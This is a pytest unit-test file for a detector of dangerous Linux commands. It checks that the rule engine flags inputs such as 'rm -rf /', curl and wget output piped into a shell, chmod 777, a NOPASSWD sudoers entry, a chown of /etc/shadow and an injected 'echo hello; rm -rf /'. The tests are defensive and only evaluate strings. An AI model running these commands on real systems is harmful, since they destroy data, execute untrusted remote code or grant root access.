"""Unit tests for core/linux_advisor/command_rules.py — the default
dangerous-command rule set, run through RuleEngine."""

from __future__ import annotations

import pytest

from core.linux_advisor.command_rules import DEFAULT_COMMAND_RULES
from core.linux_advisor.rule_engine import RuleEngine

pytestmark = pytest.mark.unit


@pytest.fixture()
def engine() -> RuleEngine:
    return RuleEngine(DEFAULT_COMMAND_RULES)


def test_rm_rf_root_matches(engine: RuleEngine) -> None:
    matches = engine.evaluate("rm -rf /")
    ids = {m.rule_id for m in matches}
    assert "rm_rf_root" in ids


def test_rm_rf_generic_matches_without_root_target(engine: RuleEngine) -> None:
    matches = engine.evaluate("rm -rf /home/user/tmpdir")
    ids = {m.rule_id for m in matches}
    assert "rm_rf_generic" in ids
    assert "rm_rf_root" not in ids


def test_chmod_777_matches(engine: RuleEngine) -> None:
    matches = engine.evaluate("chmod 777 /var/www")
    assert any(m.rule_id == "chmod_777" for m in matches)


def test_chmod_777_recursive_matches(engine: RuleEngine) -> None:
    matches = engine.evaluate("chmod -R 777 /srv/app")
    assert any(m.rule_id == "chmod_777" for m in matches)


def test_chmod_666_matches(engine: RuleEngine) -> None:
    matches = engine.evaluate("chmod 666 /etc/config.ini")
    assert any(m.rule_id == "chmod_666" for m in matches)


def test_curl_pipe_bash_matches(engine: RuleEngine) -> None:
    matches = engine.evaluate("curl http://example.com/install.sh | bash")
    assert any(m.rule_id == "curl_pipe_shell" for m in matches)


def test_wget_pipe_sh_matches(engine: RuleEngine) -> None:
    matches = engine.evaluate("wget -qO- http://example.com/x.sh | sh")
    assert any(m.rule_id == "wget_pipe_shell" for m in matches)


def test_sudo_nopasswd_all_matches(engine: RuleEngine) -> None:
    matches = engine.evaluate("alice ALL=(ALL) NOPASSWD: ALL")
    assert any(m.rule_id == "sudo_nopasswd_all" for m in matches)


def test_sudo_su_root_matches(engine: RuleEngine) -> None:
    matches = engine.evaluate("sudo su -")
    assert any(m.rule_id == "sudo_su_root" for m in matches)


def test_chown_shadow_away_from_root_matches(engine: RuleEngine) -> None:
    matches = engine.evaluate("chown attacker /etc/shadow")
    assert any(m.rule_id == "chown_sensitive_away_from_root" for m in matches)


def test_chown_shadow_to_root_does_not_match(engine: RuleEngine) -> None:
    matches = engine.evaluate("chown root /etc/shadow")
    ids = {m.rule_id for m in matches}
    assert "chown_sensitive_away_from_root" not in ids


def test_mkdir_then_chmod_777_combo_matches(engine: RuleEngine) -> None:
    matches = engine.evaluate("mkdir /srv/shared && chmod 777 /srv/shared")
    assert any(m.rule_id == "mkdir_then_chmod_777" for m in matches)


def test_benign_command_matches_nothing(engine: RuleEngine) -> None:
    assert engine.evaluate("ls -la /home") == []


def test_command_injection_shaped_input_still_flagged_not_executed(engine: RuleEngine) -> None:
    """Adversarial case: a benign-looking prefix with an injected destructive
    suffix must still be flagged by the underlying rule — and, crucially,
    this package never executes anything, so "flagged" is the only possible
    outcome regardless of injection shape."""
    matches = engine.evaluate("echo hello; rm -rf /")
    assert any(m.rule_id in ("rm_rf_root", "rm_rf_generic") for m in matches)
